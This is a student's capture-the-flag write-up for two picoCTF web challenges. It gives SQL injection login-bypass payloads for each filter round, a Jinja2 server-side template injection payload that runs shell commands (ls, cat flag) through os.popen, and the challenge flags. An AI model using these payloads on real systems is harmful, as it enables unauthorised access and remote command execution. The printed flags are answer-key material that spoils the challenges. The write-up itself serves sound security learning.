# 1. Web Gauntlet
This challenge involves bypassing filters in a web application to perform SQL injection. Each round presents different filtering rules, requiring us to adapt our injection techniques accordingly.

## Solution:
1. I started by accessing the login page and noting the URL `http://shape-facility.picoctf.net:57056/`. The initial filter page showed "Filters: ***or…***", indicating the filters. I attempted an injection with username `admin` and any password. The response showed the SQL query:  
`SELECT * FROM users WHERE username='admin' AND password='...'`.  
Recognizing the pattern, I realized SQL injection was possible.

2. I searched for how to comment out parts of SQL queries to bypass conditions. I learned that double hyphens `--` or multiline comment `/*` can be used.  
I tested `admin' --` which worked, as it commented out the rest of the query.
    ```
    SELECT * FROM users WHERE username='admin' -- AND password='gfdgsdbsd’
    ```

3. For the second round, the filters changed to "Round2: or and like = —". The double hyphen was disabled, so I used multiline comments: `admin' /*`. This again worked, allowing me to bypass filters. So the final SQL query that it showed was -
    ```
    SELECT * FROM users WHERE username='admin' /* ' AND password='dvbsdcvcddv’
    ```

4. In the third round, the filters included `or`, `=`, `like`, `>`, `<`, and `—`. I tried the previous method but it didn't work. I then learned that terminating the SQL statement early with a semicolon could help. So I used `admin';` as username and any random password, which allowed me to inject and bypass this round.
    ```
    SELECT * FROM users WHERE username='admin';' AND password='dfsdsdsd’
    ```

5. In the fourth round, I faced filters with "Round4: or and = like > < -- admin". The word "admin" was tricky. After many research and hit and trials I realized that i can concatenate strings using `||` in SQL. I tested `ad'||'min'` as username, which worked to produce admin.
    ```
    SELECT * FROM users WHERE username='ad'||'min';' AND password='fdsfsdfsf’
    ```

6. For the fifth round, the filters included extra "union admin". I was not able to figure out.But it suddenly striked that the previous command was not in the filters. So I used `ad'||'min'` again, which succeeded in bypassing all the rounds.
    ```
    SELECT * FROM users WHERE username='ad'||'min';' AND password='sdfsdfsdfsd’
    ```
<img width="1919" height="1027" alt="image (1)" src="https://github.com/user-attachments/assets/5d2e3a71-efa3-4547-8c66-774416c97716" />

7. After refreshing the page, there was no falg showing. After that I noticed my flag was commented out in the PHP code in the filter page. I extracted the flag from the comment: `picoCTF{y0u_m4d3_1t_79a0ddc6}`.
<img width="1919" height="1029" alt="image (2)" src="https://github.com/user-attachments/assets/a12d322e-4a38-4b92-aab4-b2608bf54ff1" />

## Flag:
```
picoCTF{y0u_m4d3_1t_79a0ddc6}
```

## Concepts learnt:
- I learned that SQL comments `--` and `/* */` can be used to bypass filters.
- Early termination of SQL queries with a semicolon `;` allows injection even when filters restrict certain keywords.
- String concatenation in SQL can be achieved with `||`, in this case we wrote admin using that.
- Using searches and going through different resources to get knowledge about some sql injection techniques.

## Notes:
Initially, I tried using `+` for string concatenation but it didn't work because SQL uses `||`(which i got to know later). Also, I spent some time trying to inject different injection techniques before using concatenation startegy and early termination.

## Resources:
- [SQL Injection Short Video](https://www.youtube.com/watch?v=2OPVViV-GQk)
- [W3Schools documentation](https://www.w3schools.com/sql/sql_injection.asp)

- Some google searches







# 2. SSTI1
This challenge involves exploiting a server-side template injection vulnerability on a website that allows users to announce messages. We need to use payloads to read the flag.

## Solution:
1. At first, I was not sure what to do so I checked the full form of SSTI which is Server Side Template Injection.  
2. I tried to input simple commands like `ls` into the message box, but the server just echoed back `ls` itself.
3. Then I watched a video explaining what templates are and how to test for SSTI vulnerabilities. It suggested using payloads like `${{<%[%'"}}%\` to see if the server responds unexpectedly.  
4. I entered the payload `${{<%[%'"}}%\` and got an internal server error which indicated that the server might be vulnerable to SSTI.  
5. Next I needed to identify which template engine was used on the backend because different engines interpret payloads differently. I tested with Django and Jinja2 templates,and the Jinja one worked.  
6. I tried `{{7*7}}` and it returned `49`, indicating Jinja2 was being used. Additionally, `{{7*'7'}}` returned `7777777`.(This was written in the PortSwigger image)
7. In the video he mentioned another resource and I opened a git repo PayloadsAllTheThings to find relevant payloads for Jinja2 SSTI.  
8. I discovered a payload:   
`{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`   
which executes the `ls` command and lists files.  
9. Using this payload, I saw files like `__pycache__`, `app.py`, `flag`, and `requirements.txt`.  
10. To get the flag, I modified the payload to read the `flag` file using cat command:  
`{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}`.  
11. Executing this payload, I retrieved the flag which is `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}`.

## Flag:
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}
```

## Concepts learnt:
- Understanding what server-side template injection (SSTI) is.
- Recognizing different template engines like Jinja2 and their syntax.
- How to test for SSTI vulnerabilities using payloads.
- Using payloads to execute system commands through Jinja2 templates.

## Notes:
- Initially I tried simple payloads without knowing the template engine which did not worked.
- I wasted much time to find the correct jinja2 payload that reads the file.

## Resources:
- [PayloadsAllTheThings - SSTI Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md)
- [PortSwigger Web Security Academy - SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [YouTube Tutorial on SSTI](https://www.youtube.com/watch?v=9vwTHHfUbSA)